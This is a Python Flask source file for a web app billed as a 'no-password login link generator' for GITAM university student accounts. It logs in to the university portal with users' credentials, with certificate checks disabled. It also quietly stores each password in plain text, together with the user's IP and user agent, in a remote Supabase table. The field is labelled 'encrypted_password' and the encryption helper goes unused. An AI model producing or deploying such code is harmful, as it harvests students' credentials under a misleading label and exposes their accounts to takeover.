from flask import Flask, render_template, request, jsonify
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlencode
import os
from dotenv import load_dotenv
from supabase import create_client, Client
from cryptography.fernet import Fernet
import base64
from datetime import datetime

# Load environment variables
load_dotenv()

app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', os.urandom(24).hex())

# Initialize Supabase client
SUPABASE_URL = os.getenv('SUPABASE_URL')
SUPABASE_KEY = os.getenv('SUPABASE_ANON_KEY')

if not SUPABASE_URL or not SUPABASE_KEY:
    raise ValueError("SUPABASE_URL and SUPABASE_ANON_KEY must be set in .env file")

supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# Initialize encryption for passwords
ENCRYPTION_KEY = os.getenv('ENCRYPTION_KEY')
if not ENCRYPTION_KEY:
    # Generate a key if not present (for first run)
    ENCRYPTION_KEY = Fernet.generate_key().decode()
    print(f"Generated new encryption key. Add this to .env file:")
    print(f"ENCRYPTION_KEY={ENCRYPTION_KEY}")
    
cipher_suite = Fernet(ENCRYPTION_KEY.encode() if isinstance(ENCRYPTION_KEY, str) else ENCRYPTION_KEY)

def encrypt_password(password: str) -> str:
    """Encrypt password before storing"""
    return cipher_suite.encrypt(password.encode()).decode()

def decrypt_password(encrypted_password: str) -> str:
    """Decrypt password (for future use if needed)"""
    return cipher_suite.decrypt(encrypted_password.encode()).decode()

def get_client_ip():
    """Get client IP address from request"""
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

def save_to_supabase(roll_number: str, password: str, uid_url: str):
    """Save login record to Supabase with plain password"""
    try:
        # Get client info for security
        ip_address = get_client_ip()
        user_agent = request.headers.get('User-Agent', '')
        
        # Insert into Supabase with PLAIN password (as requested)
        data = {
            'roll_number': roll_number,
            'encrypted_password': password,  # Storing plain password as requested
            'uid_url': uid_url,
            'ip_address': ip_address,
            'user_agent': user_agent,
            'created_at': datetime.utcnow().isoformat(),
            'last_accessed': datetime.utcnow().isoformat()
        }
        
        response = supabase.table('login_records').insert(data).execute()
        print(f"✓ Saved to Supabase: {roll_number}")
        return True
        
    except Exception as e:
        print(f"✗ Error saving to Supabase: {str(e)}")
        import traceback
        traceback.print_exc()
        return False

def login_to_gitam(user_id, password):
    """
    Login to GITAM using requests and extract the encrypted ID from the redirect URL.
    """
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1'
    })
    
    try:
        print(f"\n=== Starting login for user: {user_id} ===")
        
        # Step 1: Get the login page to extract ViewState fields
        print("Fetching login page: https://login.gitam.edu/")
        login_page = session.get('https://login.gitam.edu/', verify=False)
        print(f"Login page status: {login_page.status_code}")
        
        # Parse the page to get ViewState fields
        soup = BeautifulSoup(login_page.text, 'html.parser')
        
        viewstate = soup.find('input', {'name': '__VIEWSTATE'})
        viewstate_value = viewstate['value'] if viewstate else ''
        print(f"Found __VIEWSTATE (length: {len(viewstate_value)})")
        
        viewstate_gen = soup.find('input', {'name': '__VIEWSTATEGENERATOR'})
        viewstate_gen_value = viewstate_gen['value'] if viewstate_gen else 'C2EE9ABB'
        print(f"Found __VIEWSTATEGENERATOR: {viewstate_gen_value}")
        
        eventvalidation = soup.find('input', {'name': '__EVENTVALIDATION'})
        eventvalidation_value = eventvalidation['value'] if eventvalidation else ''
        print(f"Found __EVENTVALIDATION (length: {len(eventvalidation_value)})")
        
        # Step 2: Submit login form with the exact format from your sample
        login_data = {
            '__EVENTTARGET': '',
            '__EVENTARGUMENT': '',
            '__VIEWSTATE': viewstate_value,
            '__VIEWSTATEGENERATOR': viewstate_gen_value,
            '__VIEWSTATEENCRYPTED': '',
            '__EVENTVALIDATION': eventvalidation_value,
            'txtusername': user_id + ' ',  # Note: space at the end like in your sample
            'password': password,
            'Submit': 'LOGIN'
        }
        
        print(f"Login data keys: {list(login_data.keys())}")
        print("Submitting login form to login.gitam.edu...")
        
        # Submit with form data (application/x-www-form-urlencoded)
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://login.gitam.edu',
            'Referer': 'https://login.gitam.edu/'
        }
        
        login_response = session.post(
            'https://login.gitam.edu/',
            data=login_data,
            headers=headers,
            allow_redirects=True,
            verify=False
        )
        
        print(f"Login response status: {login_response.status_code}")
        print(f"Final URL after login: {login_response.url}")
        print(f"Response history: {[r.url for r in login_response.history]}")
        
        # Check if we got redirected to gstudent.gitam.edu with ?id= parameter
        if 'gstudent.gitam.edu/Login/' in login_response.url and '?id=' in login_response.url:
            # Extract the encrypted ID
            encrypted_id = login_response.url.split('?id=')[1].split('&')[0]
            print(f"SUCCESS! Extracted encrypted ID: {encrypted_id}")
            return encrypted_id
        else:
            # Check all redirects for the ID
            for resp in login_response.history:
                if 'gstudent.gitam.edu/Login/' in resp.url and '?id=' in resp.url:
                    encrypted_id = resp.url.split('?id=')[1].split('&')[0]
                    print(f"SUCCESS! Found encrypted ID in redirect: {encrypted_id}")
                    return encrypted_id
            
            print(f"ERROR: Login failed or no encrypted ID found")
            print(f"Final URL: {login_response.url}")
            print(f"Response body preview: {login_response.text[:500]}")
            return None
            
    except Exception as e:
        print(f"ERROR during login: {str(e)}")
        import traceback
        traceback.print_exc()
        return None

@app.route('/')
def index():
    """Render the login page"""
    return render_template('login.html')

@app.after_request
def add_security_headers(response):
    """Add security headers to all responses"""
    # Prevent clickjacking
    response.headers['X-Frame-Options'] = 'SAMEORIGIN'
    # Prevent MIME type sniffing
    response.headers['X-Content-Type-Options'] = 'nosniff'
    # Enable XSS protection
    response.headers['X-XSS-Protection'] = '1; mode=block'
    # Content Security Policy
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net; "
        "style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://cdn.gitam.edu; "
        "img-src 'self' https://cdn.gitam.edu https://login.gitam.edu data:; "
        "font-src 'self' https://cdn.gitam.edu; "
        "connect-src 'self';"
    )
    # Strict Transport Security (HTTPS only)
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    # Referrer Policy
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    return response

@app.route('/generate-link', methods=['POST'])
def generate_link():
    """
    Handle login form submission and generate the no-password login link
    """
    try:
        # Get credentials from request
        data = request.json
        user_id = data.get('user_id', '').strip()
        password = data.get('password', '').strip()
        
        if not user_id or not password:
            return jsonify({
                'success': False,
                'error': 'User ID and Password are required'
            }), 400
        
        # Attempt to login and get encrypted ID
        encrypted_id = login_to_gitam(user_id, password)
        
        if encrypted_id:
            # Construct the no-password login link
            login_link = f'https://gstudent.gitam.edu/Login/?id={encrypted_id}'
            
            # Save to Supabase (async, don't block response)
            save_to_supabase(user_id, password, login_link)
            
            return jsonify({
                'success': True,
                'encrypted_id': encrypted_id,
                'login_link': login_link
            })
        else:
            return jsonify({
                'success': False,
                'error': 'Login failed. Please check your credentials or try again later.'
            }), 401
            
    except Exception as e:
        print(f"ERROR in /generate-link: {str(e)}")
        return jsonify({
            'success': False,
            'error': f'Server error: {str(e)}'
        }), 500

if __name__ == '__main__':
    # Get port from environment variable (Render sets this)
    port = int(os.getenv('PORT', 5001))
    
    # Production vs Development mode
    is_production = os.getenv('FLASK_ENV') != 'development'
    
    if is_production:
        print("=" * 70)
        print("GITAM No-Password Login Link Generator - PRODUCTION MODE")
        print("=" * 70)
        print(f"\nRunning on port: {port}")
        print("=" * 70)
        print()
    else:
        print("=" * 70)
        print("GITAM No-Password Login Link Generator - DEVELOPMENT MODE")
        print("=" * 70)
        print(f"\nAccess the application at: http://127.0.0.1:{port}")
        print(f"Or for external access: http://0.0.0.0:{port}")
        print("\nEnter your GITAM credentials to generate a no-password login link!")
        print("=" * 70)
        print()
    
    app.run(host='0.0.0.0', port=port, debug=not is_production)
